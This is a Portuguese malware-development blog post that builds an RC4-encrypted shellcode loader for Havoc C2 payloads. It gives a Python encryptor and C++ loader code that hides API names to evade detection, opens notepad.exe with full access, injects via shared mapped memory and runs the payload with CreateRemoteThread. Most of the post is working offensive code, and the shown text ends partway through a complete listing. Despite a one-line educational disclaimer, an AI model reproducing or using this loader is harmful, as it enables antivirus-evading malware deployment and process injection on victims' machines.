---
weight: 11
title: "Post XI: Criando Um Carregador Simples Part-2"
date: 2024-07-22T15:58:26+08:00
lastmod: 2024-07-22T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom nesse post vamos melhorar e aprimorar nosso shellcode loader, já que vimos no post passado que esse nosso código está muito simples.
## Começo

Bom como falei nesse post vamos estar utilizando o [havoc-framework](https://havocframework.com/), então vamos gerar uma shellcode no havoc, e na parte de configuração da carga util vamos selecionar algumas coisas como:
Habilitar `Inderect Syscall`.
Selecionar em Sleep technique  `Ekko`.
De resto não precisamos mudar mais nada, apenas vamos gerar nossa shellcode.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.
## Ofucação de Shellcode
Existem vários projetos para ofuscar nossa shellcode, como `AES`, `XOR`, `IPv4`, `MAC`, dentre várias outras. Mas vou usar a boa e velha ofuscação `RC4`.

Vou fornecer abaixo um código em Python que vai tanto ofuscar sua shellcode quanto fornecer o código necessário para conseguir descriptografar a shellcode.

`Uso: python rc4.py <binario> > salvo.txt"`

```python
import sys
import random

def rc4_encrypt(data, key):
    S = list(range(256))
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])

    return out

def generate_random_key(length):
    return [random.randint(0, 255) for _ in range(length)]

def main():
    if len(sys.argv) != 2:
        print("Uso: python rc4.py <binario>")
        sys.exit(1)

    input_file = sys.argv[1]

    try:
        with open(input_file, "rb") as f:
            data = f.read()
    except FileNotFoundError:
        print(f"File '{input_file}' not found.")
        sys.exit(1)

    random_key = generate_random_key(16)
    encrypted_data = rc4_encrypt(data, random_key)

    # Calculating the size of the encrypted payload
    encrypted_payload_size = len(encrypted_data)

    print("unsigned char payload[] = {")
    for i, byte in enumerate(encrypted_data):
        if i % 16 == 0:
            print("\t", end="")
        print(f"0x{byte:02X}, ", end="")
        if (i + 1) % 8 == 0:
            print("")
    print("\n};")

    print("\nunsigned char chaveRC4[] = {")
    for i, byte in enumerate(random_key):
        if i % 8 == 0:
            print("\t", end="")
        print(f"0x{byte:02X}, ", end="")
        if (i + 1) % 8 == 0:
            print("")
    print("};")

    print(f"\nEncrypted payload size: {encrypted_payload_size} bytes")


    print("""
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 """)

    print("""
typedef struct _USTRING {
    ULONG Length;
    ULONG MaximumLength;
    PWSTR Buffer;
} USTRING;

typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    USTRING* Img,
    USTRING* Key
    );

BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
    NTSTATUS STATUS;
    USTRING Key = { dwRc4KeySize, dwRc4KeySize, reinterpret_cast<PWSTR>(pRc4Key) };
    USTRING Img = { sPayloadSize, sPayloadSize, reinterpret_cast<PWSTR>(pPayloadData) };
	  char a_dll_name[] = { 'A','d','v','a','p','i','3','2',0 };
	  char NotSysFunc32[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2',0 };
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(a_dll_name), NotSysFunc32);

    STATUS = SystemFunction032(&Img, &Key);
    if (STATUS != 0x0) {
        return FALSE;
    }
    return TRUE;
}
 """)
    
    print("""
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 """)

if __name__ == "__main__":
    main()
```
## Código
Nosso código vai começar definindo algumas estruturas como `CLIENT_ID`, `UNICODE_STRING`, `OBJECT_ATTRIBUTES`, que vão ser necessárias devido ao uso que vamos fazer de `NtOpenProcess`.

`CLIENT_ID`: Essa estrutura armazena identificadores únicos para um processo e uma thread. O uso dessas identificações é crucial para que o sistema saiba a qual processo ou thread estamos nos referindo, permitindo manipulações precisas.


```cpp
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess; // Identificador do processo
    HANDLE UniqueThread;  // Identificador da thread
} CLIENT_ID, * PCLIENT_ID;

```


`UNICODE_STRING`: Usada para representar strings que suportam caracteres Unicode. Isso é importante em sistemas que precisam manipular diferentes conjuntos de caracteres, permitindo que o programa seja mais flexível e compatível com diversas linguagens:

```cpp
typedef struct _UNICODE_STRING {
    USHORT Length;          // Comprimento da string
    USHORT MaximumLength;   // Comprimento máximo da string
    PWSTR  Buffer;          // Ponteiro para os caracteres
} UNICODE_STRING, * PUNICODE_STRING;

```

`OBJECT_ATTRIBUTES`: Contém informações sobre objetos do Windows, como processos e threads. Essa estrutura é fundamental ao abrir processos, pois permite definir atributos como segurança e nome do objeto:

```cpp
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;             // Comprimento da estrutura
    HANDLE          RootDirectory;      // Diretório raiz (pode ser NULL)
    PUNICODE_STRING ObjectName;         // Nome do objeto (pode ser NULL)
    ULONG           Attributes;         // Atributos do objeto
    PVOID           SecurityDescriptor;  // Descritor de segurança (pode ser NULL)
    PVOID           SecurityQualityOfService; // Qualidade de serviço (pode ser NULL)
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
```

```cpp
typedef NTSTATUS(NTAPI* NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);
```

```cpp
typedef HANDLE(WINAPI* FuncaoThread)(
    HANDLE,
    LPSECURITY_ATTRIBUTES,
    SIZE_T,
    LPTHREAD_START_ROUTINE,
    LPVOID,
    DWORD,
    LPDWORD
);

FuncaoThread CriarThreadRemota;
```

Vamos utilizar uma técnica importante que é a ofuscação de strings:

```cpp
char dllKernel[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
```
```cpp
char nomeFuncaoThread[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };
````

Esse método oculta o nome da DLL `kernel32.dll` e o nome da função `CreateRemoteThread` de uma forma que dificulta a leitura direta do código. isso pode ajudar a evitar detecções por ferramentas automatizadas que buscam por strings conhecidas.

Função `GetNtFunction`:
Esta nossa função carrega funções da biblioteca `ntdll.dll`, que contém APIs nativas do Windows:

```cpp
template<typename T>
T GetNtFunction(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Falha ao obter identificador para ntdll.dll" << std::endl;
        return nullptr; // Tratamento de erro se a DLL não for encontrada
    }
    return reinterpret_cast<T>(GetProcAddress(ntdll, funcName));
}
```

Vamos, obviamente, fornecer a parte do código responsável por descriptografar nossa shellcode:

```cpp
typedef struct _USTRING {
	ULONG Length;
	ULONG MaximumLength;
	PWSTR Buffer;
} USTRING;

typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	USTRING* Img,
	USTRING* Key
	);

BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
	NTSTATUS STATUS;
	USTRING Key = { dwRc4KeySize, dwRc4KeySize, reinterpret_cast<PWSTR>(pRc4Key) };
	USTRING Img = { sPayloadSize, sPayloadSize, reinterpret_cast<PWSTR>(pPayloadData) };
	char a_dll_name[] = { 'A','d','v','a','p','i','3','2',0 };
	char NotSysFunc32[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2',0 };
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(a_dll_name), NotSysFunc32);

	STATUS = SystemFunction032(&Img, &Key);
	if (STATUS != 0x0) {
		return FALSE;
	}
	return TRUE;
}
```

Nossa função `InjetarPayload` vai ser responsável por mapear a memória do processo alvo e injetar o payload.

```cpp
BOOL InjetarPayload(IN HANDLE handleProcesso, IN PBYTE payload, IN SIZE_T tamanhoPayload, OUT PVOID* enderecoRemoto);
```

`handleProcesso`: Esse parâmetro representa um identificador (handle) para o processo remoto no qual eu pretendo injetar o payload. Eu passo esse identificador como argumento para que a função saiba em qual processo realizar o mapeamento de memória.
`payload`: Esse é um ponteiro para o buffer que contém o payload.
`tamanhoPayload`: Como o nome indica, esse parâmetro contém o tamanho, em bytes, do payload. Ele é fundamental para garantir que a função saiba o quanto de memória precisa reservar e transferir para o processo remoto.
`enderecoRemoto`: Esse é um ponteiro de saída que, após a execução da função, irá conter o endereço remoto onde o payload foi mapeado no processo alvo.

Agora, vou detalhar as variáveis que eu utilizo ao longo da função:

```cpp
BOOL estado = TRUE;
HANDLE handleMapeamentoArquivo = NULL;
PVOID enderecoLocal = NULL, enderecoMapeamentoRemoto = NULL;
```

`estado`: Eu inicializo essa variável como TRUE para indicar que o processo está ocorrendo de forma correta até aquele ponto. Ao longo da execução, vou alterando esse valor para FALSE caso algum erro aconteça, o que me permite saber se tudo correu como esperado.
`handleMapeamentoArquivo`: Esta variável armazena o identificador do objeto de mapeamento de arquivo que eu crio na memória. Esse handle é crucial para que eu possa compartilhar o espaço de memória entre o meu processo e o processo remoto.
`enderecoLocal`: Esta variável contém o endereço local onde o payload será copiado inicialmente, ou seja, no meu processo.
`enderecoMapeamentoRemoto`: Por fim, essa variável armazenará o endereço no processo remoto onde o payload foi injetado, após o mapeamento ser realizado com sucesso.

Agora, vou explicar detalhadamente o fluxo de execução do código.

---
### **Criação do Mapeamento de Arquivo:**<br>
O primeiro passo é criar um objeto de mapeamento de arquivo na memória:

```cpp
handleMapeamentoArquivo = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, (DWORD)tamanhoPayload, NULL);
if (handleMapeamentoArquivo == NULL) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Erro ao criar o mapeamento de arquivo." << std::endl;
    estado = FALSE;
    goto FimDaFuncao;
}
```

`CreateFileMapping`: Essa função cria um objeto de mapeamento de arquivo, mas aqui estou usando `INVALID_HANDLE_VALUE` como primeiro argumento, o que significa que o mapeamento será feito diretamente na memória, sem que haja um arquivo físico envolvido. Isso é útil para criar um espaço de memória compartilhado entre o meu processo e o processo remoto, sem a necessidade de usar arquivos intermediários.<br>
`PAGE_EXECUTE_READWRITE`: Aqui, defino as permissões do mapeamento. Eu escolhi usar `PAGE_EXECUTE_READWRITE` para garantir que a memória possa ser lida, escrita e executada tanto no processo local quanto no remoto. Essa escolha pode ter implicações de segurança, já que conceder permissões de execução para um espaço de memória compartilhado pode ser um risco, mas para o propósito deste código, é necessário.

Caso a criação do mapeamento de arquivo falhe, defino o estado como `FALSE` e exibo uma mensagem de erro. A função termina neste ponto, caso haja uma falha.

---
### **Mapeamento Local da Memória**<br>
Depois que o objeto de mapeamento é criado com sucesso, o próximo passo é mapear essa memória para o meu processo:

```cpp
enderecoLocal = MapViewOfFile(handleMapeamentoArquivo, FILE_MAP_WRITE, NULL, NULL, tamanhoPayload);
if (enderecoLocal == NULL) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Erro ao mapear a visão do arquivo." << std::endl;
    estado = FALSE;
    goto FimDaFuncao;
}
```

`MapViewOfFile`: Com essa função, estou mapeando o objeto de arquivo que criei para o espaço de memória do meu processo. Isso me dá acesso direto à memória onde eu poderei copiar o payload. O `FILE_MAP_WRITE` me garante permissão para escrever na memória mapeada.<br>

E se essa operação falhar, a execução também é interrompida, com uma mensagem de erro sendo exibida.

---
### **Cópia do Payload**<br>
Agora que a memória foi mapeada para o meu processo local, o próximo passo é copiar o payload para essa área de memória:

```cpp
memcpy(enderecoLocal, payload, tamanhoPayload);
```

Aqui, simplesmente utilizo a função `memcpy` para copiar o conteúdo do payload para o endereço de memória local que foi mapeado anteriormente.

---
### **Mapeamento Remoto da Memória**
O próximo passo, e o mais importante, é mapear essa memória compartilhada no processo remoto, onde o payload será injetado:

```cpp
enderecoMapeamentoRemoto = MapViewOfFile2(handleMapeamentoArquivo, handleProcesso, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
if (enderecoMapeamentoRemoto == NULL) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Erro ao mapear a visão do arquivo remoto." << std::endl;
    estado = FALSE;
    goto FimDaFuncao;
}
```

`MapViewOfFile2`: Aqui eu utilizo essa função para mapear o mesmo objeto de memória no espaço de endereço do processo remoto, usando o `handleProcesso` que recebi como argumento. Se a operação for bem-sucedida, a variável `enderecoMapeamentoRemoto` conterá o endereço remoto onde o payload foi mapeado.

E se o mapeamento falhar, eu trato o erro da mesma maneira que os anteriores.

---
### **Finalização**
Por fim, termino a função armazenando o endereço remoto no ponteiro de saída `enderecoRemoto`, fecho o handle do mapeamento de arquivo e retorno o status final da função:

```cpp
FimDaFuncao:
*enderecoRemoto = enderecoMapeamentoRemoto;
if (handleMapeamentoArquivo)
    CloseHandle(handleMapeamentoArquivo);
return estado;
```

`enderecoRemoto`: Aqui, salvo o endereço remoto resultante da operação de mapeamento. Isso é importante, pois o processo que chamou essa função pode querer saber onde o payload foi injetado.<br>
`CloseHandle`: Sempre que trabalhar com handles no Windows, é uma boa prática garantir que eles sejam fechados corretamente após o uso. Aqui, eu fecho o handle do objeto de mapeamento de arquivo para liberar os recursos.<br>

A função, por fim, retorna o valor booleano `estado`, que indicará ao chamador se a operação foi bem-sucedida ou não.

Agora vamos falar sobre nossa função `ObterHandleProcesso`:
A função chamada ObterHandleProcesso, tem a seguinte forma:

```cpp
BOOL ObterHandleProcesso(IN LPCWSTR nomeProcesso, OUT DWORD* idProcesso, OUT HANDLE* handleProcesso, NtOpenProcess_t NtOpenProcess);
```

Essa função tem o objetivo de obter o handle de um processo com base no nome de um executável que está em execução no sistema. Aqui, eu passo o nome do processo como entrada e retorno o handle desse processo, além de seu identificador. Vou detalhar cada um dos parâmetros da função:

`nomeProcesso`: Esse é o nome do processo que estou procurando, passado como uma string wide (`LPCWSTR`).
`idProcesso`: Um ponteiro de saída que armazenará o identificador (ID) do processo encontrado.
`handleProcesso`: Um ponteiro de saída que armazenará o handle do processo após encontrá-lo e abri-lo com sucesso.
`NtOpenProcess`: Uma função (`NtOpenProcess_t`) que utilizo para abrir o processo de forma mais direta, em vez de usar a função padrão do Windows `OpenProcess`.
A função retorna um valor booleano (`TRUE` ou `FALSE`) que me informa se a operação foi bem-sucedida ou não.

---
### **Variáveis Locais**
Vou explicar as variáveis que uso na função:

```cpp
HANDLE handleSnapshot = NULL;
PROCESSENTRY32 entradaProcesso;
entradaProcesso.dwSize = sizeof(PROCESSENTRY32);
```

`handleSnapshot`: Esse é um handle para o snapshot dos processos que eu crio usando a função `CreateToolhelp32Snapshot`. Esse snapshot é essencial para listar todos os processos em execução no sistema e identificar o que estou procurando.<br>
`entradaProcesso`: Esta estrutura contém informações sobre cada processo retornado pelo snapshot. A variável `dwSize` é configurada para o tamanho da estrutura `PROCESSENTRY32`, como exigido pela API do Windows.

---
### **Fluxo de Execução**
Agora, vou explicar detalhadamente o fluxo de execução dessa parte do código.
Criação do Snapshot de Processos

O primeiro passo que faço na função é capturar um snapshot de todos os processos em execução no sistema:

```cpp
handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
if (handleSnapshot == INVALID_HANDLE_VALUE) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Erro ao criar snapshot do processo." << std::endl;
    goto FimDaFuncao;
}
```

`CreateToolhelp32Snapshot`: Aqui, crio um snapshot de todos os processos do sistema usando o flag `TH32CS_SNAPPROCESS`. Isso me permite enumerar todos os processos que estão em execução no momento. Caso o snapshot não seja criado com sucesso, defino o estado de erro, mostro uma mensagem de erro e vou direto para o final da função, onde trato a limpeza de recursos.

---
### **Obtenção do Primeiro Processo no Snapshot**
Depois de criar o snapshot, precisamos começar a iterar sobre os processos listados:

```cpp
if (!Process32First(handleSnapshot, &entradaProcesso)) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Erro ao obter o primeiro processo." << std::endl;
    goto FimDaFuncao;
    return FALSE;
}
```

`Process32First`: Essa função retorna o primeiro processo do snapshot. Se não conseguir obter o primeiro processo, também exibo uma mensagem de erro e termino a execução da função.

---
### **Iteração sobre os Processos**
Uma vez que eu tenha o primeiro processo, passo a iterar sobre todos os processos listados pelo snapshot:

```cpp
do {
    WCHAR nomeMinusculo[MAX_PATH * 2];
    DWORD tamanho = lstrlenW(entradaProcesso.szExeFile);
    DWORD i = 0;
    RtlSecureZeroMemory(nomeMinusculo, MAX_PATH * 2);
```

`nomeMinusculo`: Aqui, estou criando um buffer temporário para armazenar o nome do processo em minúsculas. O motivo disso é que, em algumas situações, a comparação de nomes de processos pode ser sensível a maiúsculas e minúsculas, então eu converto tudo para minúsculas para garantir uma comparação adequada.<br>
`RtlSecureZeroMemory`: Essa função é utilizada para zerar o conteúdo da variável `nomeMinusculo`, garantindo que não haja lixo de memória antes de usá-la.

---
### **Conversão do Nome do Processo para Minúsculas**
Agora, converto o nome do processo que está na entrada para minúsculas:

```cpp
if (tamanho < MAX_PATH * 2) {
    for (; i < tamanho; i++)
        nomeMinusculo[i] = (WCHAR)tolower(entradaProcesso.szExeFile[i]);
    nomeMinusculo[i] = '\0';
}
```

Aqui, percorro o nome do processo retornado pelo snapshot (`entradaProcesso.szExeFile`) e converto cada caractere para minúsculas. Essa conversão me ajuda a realizar uma comparação mais robusta com o nome do processo que estou procurando.

---
### **Comparação com o Nome do Processo Alvo**
Depois que converto o nome do processo atual para minúsculas, comparo com o nome do processo que estou procurando:

```cpp
if (wcscmp(nomeMinusculo, nomeProcesso) == 0) {
    *idProcesso = entradaProcesso.th32ProcessID;
```

`wcscmp`: Essa função compara duas strings wide. Se o nome do processo atual for igual ao nome que estou procurando (`nomeProcesso`), extraio o `ProcessID` e o armazeno na variável de saída `idProcesso`.

---
### **Abertura do Processo com `NtOpenProcess`**
Se o processo encontrado é o correto, então tento abrir esse processo usando a função `NtOpenProcess`:

```cpp
OBJECT_ATTRIBUTES objAttr;
CLIENT_ID clientId;
InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
clientId.UniqueProcess = (HANDLE)(*idProcesso);
clientId.UniqueThread = 0;

NTSTATUS status = NtOpenProcess(handleProcesso, PROCESS_ALL_ACCESS, &objAttr, &clientId);
if (status != 0) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Falha ao abrir o processo." << std::endl;
    break;
}
```

`NtOpenProcess`: Esta função, fornecida por NT (kernel-level API), é uma maneira direta de abrir o processo com o máximo de permissões (`ROCESS_ALL_ACCESS`). Eu utilizo isso para obter o `handleProcesso` com todas as permissões necessárias para futuras operações no processo remoto. Caso a abertura falhe (se `status != 0`), exibo uma mensagem de erro e interrompo a iteração.

---
### **Iteração Continuada**
Caso o processo encontrado não seja o desejado, continuo iterando sobre os demais processos usando `Process32Next`:

```cpp
} while (Process32Next(handleSnapshot, &entradaProcesso));
```

Essa função nos permite obter o próximo processo no snapshot. Se não houver mais processos, a iteração termina.

---
### **Finalização**
Por fim, encerro a função limpando os recursos e retornando o resultado:

```cpp
FimDaFuncao:
if (handleSnapshot != NULL)
    CloseHandle(handleSnapshot);
if (*idProcesso == NULL || *handleProcesso == NULL)
    return FALSE;
return TRUE;
```

`CloseHandle`: Fecho o handle do snapshot de processos, garantindo que não haja vazamentos de recursos.
Verificação de Saída: Verifico se tanto o `idProcesso` quanto o `handleProcesso` foram atribuídos corretamente. Se algum deles for `NULL`, retorno `FALSE`, indicando que o processo não foi encontrado ou não pôde ser aberto. Caso contrário, retorno `TRUE`, indicando que a função foi bem-sucedida.

---
### **Análise Detalhada da Função `main`**
A função `main` é o ponto de entrada do meu programa. Nela, faço todo o gerenciamento para obter o handle de um processo, injetar um payload e criar uma thread remota no processo de destino. A função segue um fluxo lógico de resolução de funções NT, decriptação de payloads, localização de processos e, finalmente, a execução do payload.

---
### **Declaração Inicial**
Começo declarando a função `NtOpenProcess` por meio de uma técnica comum de resolução de funções nativas de NT:

```cpp
NtOpenProcess_t NtOpenProcess = GetNtFunction<NtOpenProcess_t>("NtOpenProcess");
```

`GetNtFunction`: Essa função personalizada busca resolver a função NT `NtOpenProcess` dinamicamente em tempo de execução. Se eu não conseguir resolver essa função, meu programa não será capaz de abrir processos com acesso total através da API nativa do Windows.

Logo em seguida, verifico se a função foi carregada corretamente:

```cpp
if (!NtOpenProcess) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Falha ao resolver uma ou mais funções da API nativa do NT." << std::endl;
    return 1;
}
```

Se `NtOpenProcess` for `NULL`, exibo uma mensagem de erro e interrompo a execução, retornando um código de falha.

---
### **Variáveis Importantes**
Declaro as variáveis principais que vou utilizar durante o processo:

```cpp
HANDLE processoAlvo = NULL, threadRemota = NULL;
PVOID enderecoRemoto = NULL;
DWORD idProcessoAlvo = 0;

unsigned char payload[] = { 0x00 };
unsigned char chaveRC4[] = { 0x00 };
```

`processoAlvo`: Vai armazenar o handle do processo de destino.
`threadRemota`: Handle para a thread remota que será criada.
`enderecoRemoto`: Um ponteiro que vai armazenar o endereço remoto onde o payload foi injetado.
`idProcessoAlvo:` O identificador do processo de destino.
`payload`: Esse é o buffer contendo o payload que será injetado no processo remoto.
`chaveRC4`: A chave para a decriptação do payload.

---
### **Decriptação do Payload**
O próximo passo é decriptar o payload. Para isso, uso uma função chamada `RC4DEC`:

```cpp
BOOL DECRYPT = RC4DEC(chaveRC4, static_cast<PBYTE>(payload), sizeof(chaveRC4), sizeof(payload));
```

`RC4DEC`: Esta função é responsável por aplicar a decriptação do payload usando o algoritmo RC4. Passo a chave RC4 e o payload como parâmetros, além de seus respectivos tamanhos.<br>
Se a decriptação falhar, interrompo a execução do programa:

```cpp
if (!DECRYPT) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Falha na decriptação do payload." << std::endl;
    return -1;
}
```

---
### **Localização do Processo Alvo**
Agora, preciso localizar o processo que vou atacar (no caso, o Notepad):

```cpp
std::wcout << L"[+] Pressione Enter para localizar o processo alvo." << std::endl;
std::cin.get();

if (!ObterHandleProcesso(L"notepad.exe", &idProcessoAlvo, &processoAlvo, NtOpenProcess)) {
    return -1;
}
```

`ObterHandleProcesso`: Utilizo essa função (analisada anteriormente) para localizar o processo `notepad.exe` e, se for bem-sucedido, armazeno o `idProcessoAlvo` e o `processoAlvo`. Se não conseguir localizar o processo ou abrir o handle, interrompo a execução.

Quando o processo é encontrado com sucesso, exibo algumas informações na tela:

```cpp
std::wcout << L"[+] Processo encontrado: PID " << idProcessoAlvo << std::endl;
std::wcout << L"[+] Endereco do payload: " << static_cast<void*>(payload) << std::endl;
```

Essas informações me mostram o ID do processo de destino e o endereço do payload que está prestes a ser injetado.

---
### **Injeção do Payload**
Depois de localizar o processo, vou para a etapa de injeção do payload:

```cpp
std::wcout << L"[+] Pressione Enter para injetar o payload." << std::endl;
std::cin.get();

if (!InjetarPayload(processoAlvo, payload, sizeof(payload), &enderecoRemoto)) {
    return -1;
}
```

`InjetarPayload`: Essa função, explicada anteriormente, injeta o payload no processo de destino. Se a injeção falhar, interrompo a execução.

Se a injeção for bem-sucedida, o endereço remoto onde o payload foi mapeado é exibido:

```cpp
std::wcout << L"[+] Endereco remoto apos injecao: " << enderecoRemoto << std::endl;
```

---
### **Carregamento da Função `CreateRemoteThread`**
Para executar o payload no processo remoto, preciso utilizar a função `CreateRemoteThrea`, que é responsável por criar uma thread remota no processo de destino. Para isso, obtenho o handle para o módulo `kernel32.dll` e, em seguida, o endereço da função `CreateRemoteThread`:

```cpp
HMODULE moduloKernel = GetModuleHandleA(dllKernel);
if (moduloKernel == NULL) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Erro ao obter o handle para kernel32.dll" << std::endl;
    return -1;
}

CriarThreadRemota = (FuncaoThread)GetProcAddress(moduloKernel, nomeFuncaoThread);
if (CriarThreadRemota == NULL) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << "[!] Erro ao localizar a funcao CreateRemoteThread." << std::endl;
    return -1;
}
```

`GetModuleHandleA`: Obtém o handle do módulo `kernel32.dll`, onde está localizada a função `CreateRemoteThread`.
`GetProcAddress`: Recupera o endereço da função `CreateRemoteThread` a partir do handle do módulo.

---
### **Criação da Thread Remota**
Com o endereço da função `CreateRemoteThread` em mãos, crio uma thread no processo remoto, passando o endereço onde o payload foi injetado:

```cpp
threadRemota = CriarThreadRemota(processoAlvo, NULL, (SIZE_T)0, (LPTHREAD_START_ROUTINE)enderecoRemoto, NULL, 0, NULL);
if (threadRemota == NULL)
    return 0;
```

Se a criação da thread for bem-sucedida, exibo uma mensagem indicando sucesso:

```cpp
std::wcout << L"[+] Thread remota criada com sucesso!" << std::endl;
```

---
### **Limpeza dos Recursos**

Por fim, faço a limpeza dos handles abertos:

```cpp
CloseHandle(threadRemota);
CloseHandle(processoAlvo);
```

Isso garante que não haja vazamento de recursos.

---
### Fluxo da Função Principal `(main)`

- **Carregar Funções Necessárias**: Carrega a função `NtOpenProcess`, que é fundamental para abrir o processo alvo.

- **Preparar o Payload**: Define o payload como um vetor de bytes. Este vetor deve conter o código que será injetado.

- **Decriptar o Payload**: O payload é decriptado usando `RC4DEC`.

- **Localizar o Processo**: Espera a entrada do usuário e chama `ObterHandleProcesso` para localizar o Notepad.

- **Injetar o Payload**: Chama a função `InjetarPayload`.

- **Criar uma Thread Remota**: Cria uma nova thread que executa o código injetado.

- **Fechamento de Handles**: Os handles abertos são fechados para liberar recursos do sistema.
## Código completo

```cpp
#include <windows.h>
#include <Tlhelp32.h>
#include <iostream>
#include <string>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "OneCore.lib")

// link: https://learn.microsoft.com/en-us/windows/console/console-screen-buffers#character-attributes
void SetConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}

typedef NTSTATUS(NTAPI* NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
typedef HANDLE(WINAPI* FuncaoThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

FuncaoThread CriarThreadRemota;
char dllKernel[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
char nomeFuncaoThread[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };

template<typename T>
T GetNtFunction(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << "[!] Falha ao obter identificador para ntdll.dll" << std::endl;
        return nullptr;
    }
    return reinterpret_cast<T>(GetProcAddress(ntdll, funcName));
}

typedef struct _USTRING {
	ULONG Length;
	ULONG MaximumLength;
	PWSTR Buffer;
} USTRING;

typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	USTRING* Img,
	USTRING* Key
	);

BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
	NTSTATUS STATUS;
	USTRING Key = { dwRc4KeySize, dwRc4KeySize, reinterpret_cast<PWSTR>(pRc4Key) };
	USTRING Img = { sPayloadSize, sPayloadSize, reinterpret_cast<PWSTR>(pPayloadData) };
	char a_dll_name[] = { 'A','d','v','a','p','i','3','2',0 };
	char NotSysFunc32[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2',0 };
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(a_dll_name), NotSysFunc32);

	STATUS = SystemFunction032(&Img, &Key);
	if (STATUS != 0x0) {
		return FALSE;
	}
	return TRUE;
}

